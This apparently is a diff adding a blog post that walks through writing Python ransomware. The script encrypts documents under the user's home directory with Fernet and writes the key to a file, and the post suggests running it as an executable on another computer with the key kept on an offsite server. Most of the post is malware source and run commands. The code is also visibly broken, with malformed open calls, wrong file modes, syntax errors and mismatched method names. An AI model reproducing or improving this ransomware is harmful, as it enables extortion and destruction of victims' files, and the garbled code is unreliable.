@@ -1,0 +1,128 @@
+I"9<h3 id="ransomware-concept">Ransomware Concept</h3>
+<p>The basic of ransomware is it encrypts a specified target file extension using with a key that the attacker had setup on a server somewhere to be used later for later decyption process. There are different programming languges you can use for this but the easiest and fastest way to provide a proof of concept is with python. You can check my code repo here <a href="https://github.com/AdrianDucao/run-some-crypt">run-some-crypt</a>.</p>
+
+<h4 id="content">Content</h4>
+<ol>
+  <li>generate a key to be used for encryption and decryption</li>
+  <li>write a key file</li>
+  <li>read a key file</li>
+  <li>scanning directory</li>
+  <li>encypt the target files</li>
+  <li>create cli interface</li>
+</ol>
+
+<h3 id="generate-a-key-to-be-used-for-encryption-and-decryption">generate a key to be used for encryption and decryption</h3>
+<p>Let’s begin by importing the OS module since we can use its functions for interactions with the OS, for encryption we can import the <a href="https://cryptography.io/en/latest/fernet/">Fernet(Semantic Encrytion)</a> Module.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  1 import os
+  2 from os.path import expanduser
+  3 from cryptography.fernet import Fernet
+
+</code></pre></div></div>
+
+<p>create a class and constructor, below that is the generateKey function</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  5 class Encrypt:
+  6 
+  7     def __init__(self):
+  8 
+  9         self.key = None
+ 10         self.cryptor = None
+ 11         self.file_ext_targets = ['pdf','doc','docx','ppt','pptx','txt']
+ 12 
+ 13     def generateKey(self):
+ 14 
+ 15         self.key = Fernet.generate_key()
+ 16         self.cryptor = Fernet(self.key)
+
+</code></pre></div></div>
+
+<h3 id="write-a-key-file">write a key file</h3>
+<p>now lets create a function to write the key to a file</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 23     def writeKey(self, key_filename):
+ 24         with open.(key_filename, 'b') as f:
+ 25             f.write(self.key)
+
+</code></pre></div></div>
+
+<h3 id="read-a-key-file">read a key file</h3>
+<p>moving on, create a function to read a key from a file</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 18     def readKey(self, key_filename):
+ 19         with open(key_filename, 'a') as f:
+ 20             self.key = f.read()
+ 21             self.cryptor = Fernet(self.key)
+
+</code></pre></div></div>
+
+<h3 id="scanning-directory">scanning directory</h3>
+<p>the function below allows you to scan the directories and check for target filename extensions specified earlier on self.file_ext_targets</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 28     def mainCrypt(self, root_dir, encrypted = False):
+ 29         for root, _, files in os.walk(root_dir):
+ 30             for f in files:
+ 31                 abs_file_path = os.path.join(root, f)
+ 32 
+ 33                 if not abs_file_path('.')[-1] in self.file_ext_targets:
+ 34                     continue
+ 35 
+ 36                 self.crypt_file(abs_file_path, encrypted = encrypted)
+
+</code></pre></div></div>
+
+<h3 id="encrypt-the-target-files">encrypt the target files</h3>
+<p>function to encrypt the specified filename extensions and check if that file has been encrypted or not</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 38     def encryptFile(self, file_path, encrypted = False):
+ 39         with open(file_path, 'a+') as f:
+ 40             _data = f.read()
+ 41 
+ 42             if not encrypted:
+ 43                 data = self.cryptor.encrypt(_data)
+ 44             else
+ 45                 data = self.cryptor.decrypt(_data)
+ 46 
+ 47             f.seek(0)
+ 48             f.write(data)
+
+</code></pre></div></div>
+
+<h3 id="create-a-cli-interface">create a cli interface</h3>
+<p>how it works is that you call the class we created earlier and create a conditional statement where you can specify and action you want to take e.g. encrypt or decrypt files.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 51 if __name__ == '__main__':
+ 52     #all directory
+ 53     sys_root = expanduser('~')
+ 54 
+ 55     #specific target directory
+ 56     #local_root= '.'
+ 57 
+ 58     import argparse
+ 59     parser = argparse.ArgumentParser()
+ 60     parser.add_argument('--action', required=True)
+ 61     parser.add_argument('--keyfile')
+ 62 
+ 63 
+ 64     args = parser.parse_args()
+ 65     action = args.action.lower()
+ 66     keyfile = args.keyfile
+ 67 
+ 68     lock = Encrypt()
+ 69 
+ 70     if action == 'decrypt':
+ 71         if keyfile is None:
+ 72             print('Specify path to keyfile after --keyfile')
+ 73         else:
+ 74             lock.read_key(keyfile)
+ 75             lock.mainCrypt(local_root, encrypted=True)
+ 76     elif action == 'encrypt':
+ 77         lock.generate_key()
+ 78         lock.write_key('keyfile')
+ 79         lock.mainCrypt(sys_root)
+
+
+</code></pre></div></div>
+
+<h3 id="conclusion">Conclusion</h3>
+<p>After that typing, you’re set and done. If you are planning to use this to another computer, you can create an executable file to run this code set an offsite server to host and store the keyfile for later use. Another use case for this is to make a secure encrypted files inside your flash drive or hard drive, as long as you have the keyfile or know the key you’re the only one who can open those files. It’s not a matter of if but when the quantum computers will comes to age, privacy and secuity through encryption might disappear.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 crypt.py --action encrypt
+
+$ python3 crypt.py --action decrypt --keyfile /path/keyfile
+</code></pre></div></div>
+
+<p>Happy Hunting.</p>
+:ET
